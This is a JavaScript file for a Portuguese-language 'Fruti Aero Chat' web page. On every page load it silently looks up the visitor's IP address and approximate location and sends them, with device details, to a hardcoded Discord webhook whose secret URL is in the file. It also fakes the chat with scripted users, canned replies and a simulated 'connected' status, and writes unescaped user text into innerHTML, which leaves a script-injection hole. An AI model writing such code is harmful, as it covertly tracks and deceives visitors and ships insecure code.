// Configurações
const WEBHOOK_URL = "https://discord.com/api/webhooks/1429236562134302781/9aDDtdDEO18AtU_Z7s08oRx9vjwhaez9shQWO6P3Ycf0ljNPM5iEitEd1f_8p8Opj-o2";
const CHAT_STORAGE_KEY = 'frutiaero_chat_messages';
const USER_STORAGE_KEY = 'frutiaero_user_data';

// Estado do chat
let currentUser = {
    name: 'Visitante',
    id: null,
    deviceInfo: null
};

let onlineUsers = [
    { id: 'erik', name: 'Erik', role: 'admin' },
    { id: 'gabriel', name: 'Gabriel', role: 'contributor' }
];

let messages = [];
let isConnected = false;

// Inicialização
document.addEventListener('DOMContentLoaded', async function() {
    loadUserData();
    loadMessages();
    setupEventListeners();
    await collectDeviceInfo();
    await sendWebhookData();
    updateUI();
    simulateConnection();
    
    // Simular mensagens iniciais
    setTimeout(() => {
        addSystemMessage('💬 Chat iniciado! Conecte-se com outros usuários.');
        simulateUserActivity();
    }, 1000);
});

// Coletar informações do dispositivo
async function collectDeviceInfo() {
    const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenWidth: screen.width,
        screenHeight: screen.height,
        timestamp: new Date().toISOString(),
        cookiesEnabled: navigator.cookieEnabled,
        online: navigator.onLine
    };
    
    currentUser.deviceInfo = deviceInfo;
    
    // Tentar obter IP (usando serviço público)
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        deviceInfo.ip = ipData.ip;
        
        // Obter mais detalhes de localização (aproximada)
        const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const locationData = await locationResponse.json();
        deviceInfo.location = {
            country: locationData.country_name,
            region: locationData.region,
            city: locationData.city,
            isp: locationData.org
        };
    } catch (error) {
        console.log('Não foi possível obter informações de IP:', error);
        deviceInfo.ip = 'Não disponível';
    }
    
    return deviceInfo;
}

// Enviar dados para o webhook do Discord
async function sendWebhookData() {
    if (!currentUser.deviceInfo) return;
    
    const embed = {
        title: "🚀 Novo Usuário no Fruti Aero Chat",
        color: 0x8E54E9,
        fields: [
            {
                name: "👤 Nome",
                value: currentUser.name,
                inline: true
            },
            {
                name: "🌐 IP",
                value: currentUser.deviceInfo.ip || 'Não disponível',
                inline: true
            },
            {
                name: "🖥️ Dispositivo",
                value: currentUser.deviceInfo.userAgent.substring(0, 50) + '...',
                inline: false
            },
            {
                name: "📍 Localização",
                value: currentUser.deviceInfo.location ? 
                    `${currentUser.deviceInfo.location.city}, ${currentUser.deviceInfo.location.region}, ${currentUser.deviceInfo.location.country}` :
                    'Não disponível',
                inline: true
            },
            {
                name: "📱 Tela",
                value: `${currentUser.deviceInfo.screenWidth}x${currentUser.deviceInfo.screenHeight}`,
                inline: true
            },
            {
                name: "⏰ Horário",
                value: new Date().toLocaleString('pt-BR'),
                inline: true
            }
        ],
        footer: {
            text: "Fruti Aero Chat • Desenvolvido por Erik e Gabriel"
        },
        timestamp: new Date().toISOString()
    };
    
    const payload = {
        embeds: [embed],
        username: "Fruti Aero Chat Monitor",
        avatar_url: "https://cdn-icons-png.flaticon.com/512/4712/4712035.png"
    };
    
    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        
        if (response.ok) {
            console.log('Dados enviados para o webhook com sucesso!');
        } else {
            console.log('Erro ao enviar dados para o webhook');
        }
    } catch (error) {
        console.log('Erro de conexão com o webhook:', error);
    }
}

// Configurar event listeners
function setupEventListeners() {
    // Enviar mensagem
    const messageInput = document.getElementById('message-input');
    const sendButton = document.getElementById('send-message');
    
    function sendMessage() {
        const text = messageInput.value.trim();
        if (text) {
            addMessage(text);
            messageInput.value = '';
            updateCharCount();
            messageInput.focus();
        }
    }
    
    sendButton.addEventListener('click', sendMessage);
    
    messageInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            sendMessage();
        }
    });
    
    // Atualizar contador de caracteres
    messageInput.addEventListener('input', updateCharCount);
    
    // Definir nome de usuário
    const usernameInput = document.getElementById('username-input');
    const setUsernameButton = document.getElementById('set-username');
    
    setUsernameButton.addEventListener('click', function() {
        const newName = usernameInput.value.trim() || 'Visitante';
        currentUser.name = newName;
        saveUserData();
        updateUI();
        
        showNotification(`Nome alterado para: ${newName}`);
        
        // Adicionar mensagem de sistema
        addSystemMessage(`👤 ${currentUser.name} entrou no chat!`);
        
        usernameInput.value = '';
    });
    
    usernameInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            setUsernameButton.click();
        }
    });
    
    // Limpar chat
    document.getElementById('clear-chat').addEventListener('click', function() {
        if (confirm('Tem certeza que deseja limpar todo o chat local?')) {
            messages = [];
            saveMessages();
            loadMessages();
            showNotification('Chat limpo com sucesso!');
        }
    });
}

// Atualizar contador de caracteres
function updateCharCount() {
    const input = document.getElementById('message-input');
    const charCount = document.getElementById('char-count');
    const count = input.value.length;
    charCount.textContent = `${count}/500`;
    
    if (count > 450) {
        charCount.style.color = '#ff4757';
    } else if (count > 300) {
        charCount.style.color = '#ffa502';
    } else {
        charCount.style.color = '#666';
    }
}

// Adicionar mensagem
function addMessage(text) {
    const message = {
        id: Date.now(),
        user: currentUser.name,
        text: text,
        time: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
        timestamp: Date.now(),
        type: 'user'
    };
    
    messages.push(message);
    
    // Limitar a 100 mensagens
    if (messages.length > 100) {
        messages = messages.slice(-100);
    }
    
    saveMessages();
    displayMessage(message, true);
    
    // Simular resposta de outros usuários (para demonstração)
    if (Math.random() > 0.7) {
        simulateRandomReply();
    }
}

// Adicionar mensagem do sistema
function addSystemMessage(text) {
    const message = {
        id: Date.now(),
        user: 'Sistema',
        text: text,
        time: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
        timestamp: Date.now(),
        type: 'system'
    };
    
    messages.push(message);
    saveMessages();
    displayMessage(message, false);
}

// Exibir mensagem
function displayMessage(message, isOwn = false) {
    const container = document.getElementById('messages-container');
    
    const messageDiv = document.createElement('div');
    messageDiv.className = `message ${isOwn ? 'own' : ''} ${message.type}`;
    
    messageDiv.innerHTML = `
        <div class="message-content">
            ${message.type === 'system' ? '<strong>🔔 Sistema:</strong>' : `<strong>${message.user}:</strong>`} ${message.text}
        </div>
        <div class="message-time">${message.time}</div>
    `;
    
    container.appendChild(messageDiv);
    container.scrollTop = container.scrollHeight;
}

// Carregar mensagens salvas
function loadMessages() {
    const saved = localStorage.getItem(CHAT_STORAGE_KEY);
    if (saved) {
        try {
            messages = JSON.parse(saved);
            const container = document.getElementById('messages-container');
            container.innerHTML = '';
            
            // Mostrar apenas as últimas 50 mensagens
            const recentMessages = messages.slice(-50);
            recentMessages.forEach(msg => {
                displayMessage(msg, msg.user === currentUser.name);
            });
        } catch (e) {
            console.log('Erro ao carregar mensagens:', e);
            messages = [];
        }
    }
}

// Salvar mensagens
function saveMessages() {
    localStorage.setItem(CHAT_STORAGE_KEY, JSON.stringify(messages));
}

// Carregar dados do usuário
function loadUserData() {
    const saved = localStorage.getItem(USER_STORAGE_KEY);
    if (saved) {
        try {
            const data = JSON.parse(saved);
            currentUser.name = data.name || 'Visitante';
            currentUser.id = data.id || generateUserId();
        } catch (e) {
            currentUser.id = generateUserId();
        }
    } else {
        currentUser.id = generateUserId();
    }
}

// Salvar dados do usuário
function saveUserData() {
    const data = {
        name: currentUser.name,
        id: currentUser.id,
        lastSeen: new Date().toISOString()
    };
    localStorage.setItem(USER_STORAGE_KEY, JSON.stringify(data));
}

// Gerar ID de usuário
function generateUserId() {
    return 'user_' + Math.random().toString(36).substr(2, 9);
}

// Atualizar UI
function updateUI() {
    document.getElementById('username-display').textContent = currentUser.name;
    document.getElementById('username-input').placeholder = `Atual: ${currentUser.name}`;
    
    // Atualizar lista de usuários online
    const usersList = document.getElementById('users-list');
    usersList.innerHTML = '';
    
    onlineUsers.forEach(user => {
        const userDiv = document.createElement('div');
        userDiv.className = 'user-item';
        
        let roleIcon = '';
        if (user.role === 'admin') {
            roleIcon = '<i class="fas fa-crown admin-icon"></i>';
        } else if (user.role === 'contributor') {
            roleIcon = '<i class="fas fa-code contributor-icon"></i>';
        }
        
        userDiv.innerHTML = `
            <i class="fas fa-user-circle"></i>
            <span>${user.name} ${user.id === currentUser.id ? '(Você)' : ''}</span>
            ${roleIcon}
        `;
        
        usersList.appendChild(userDiv);
    });
    
    // Adicionar usuário atual à lista se não estiver
    if (!onlineUsers.find(u => u.id === currentUser.id)) {
        onlineUsers.push({
            id: currentUser.id,
            name: currentUser.name,
            role: 'user'
        });
    }
    
    document.getElementById('online-count').textContent = `${onlineUsers.length} online`;
}

// Mostrar notificação
function showNotification(text) {
    const notification = document.getElementById('notification');
    const textElement = document.getElementById('notification-text');
    
    textElement.textContent = text;
    notification.classList.add('show');
    
    setTimeout(() => {
        notification.classList.remove('show');
    }, 3000);
}

// Simular conexão
function simulateConnection() {
    setTimeout(() => {
        isConnected = true;
        document.getElementById('connection-icon').className = 'fas fa-wifi';
        document.getElementById('connection-text').textContent = 'Conectado';
        document.getElementById('connection-icon').style.color = '#4CAF50';
        
        showNotification('✅ Conexão estabelecida com sucesso!');
    }, 2000);
}

// Simular atividade de usuários
function simulateUserActivity() {
    const responses = [
        "Olá pessoal! Como vocês estão?",
        "Alguém aí desenvolve também?",
        "Esse chat é incrível, parabéns Erik e Gabriel!",
        "Que estilo Fruti Aero mais legal!",
        "Alguém quer conversar sobre programação?",
        "Esse design responsivo ficou ótimo!",
        "Como funciona o sistema de webhook?",
        "Vocês também adoram gradients? 😍"
    ];
    
    setInterval(() => {
        if (Math.random() > 0.8 && messages.length > 0) {
            const randomUser = onlineUsers[Math.floor(Math.random() * onlineUsers.length)];
            if (randomUser.id !== currentUser.id) {
                const response = responses[Math.floor(Math.random() * responses.length)];
                const simulatedMessage = {
                    id: Date.now(),
                    user: randomUser.name,
                    text: response,
                    time: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
                    timestamp: Date.now(),
                    type: 'user'
                };
                
                messages.push(simulatedMessage);
                saveMessages();
                displayMessage(simulatedMessage, false);
            }
        }
    }, 30000); // A cada 30 segundos
}

// Simular resposta aleatória
function simulateRandomReply() {
    setTimeout(() => {
        const replies = [
            "Interessante!",
            "Concordo com você!",
            "Haha, verdade!",
            "Continue assim!",
            "Muito bom ponto!",
            "Estou aprendendo bastante aqui!"
        ];
        
        const randomUser = onlineUsers.find(u => u.id !== currentUser.id);
        if (randomUser) {
            const reply = replies[Math.floor(Math.random() * replies.length)];
            const simulatedMessage = {
                id: Date.now(),
                user: randomUser.name,
                text: reply,
                time: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
                timestamp: Date.now(),
                type: 'user'
            };
            
            messages.push(simulatedMessage);
            saveMessages();
            displayMessage(simulatedMessage, false);
        }
    }, 1000 + Math.random() * 3000);
}

// Atualizar contador de caracteres inicial
updateCharCount();
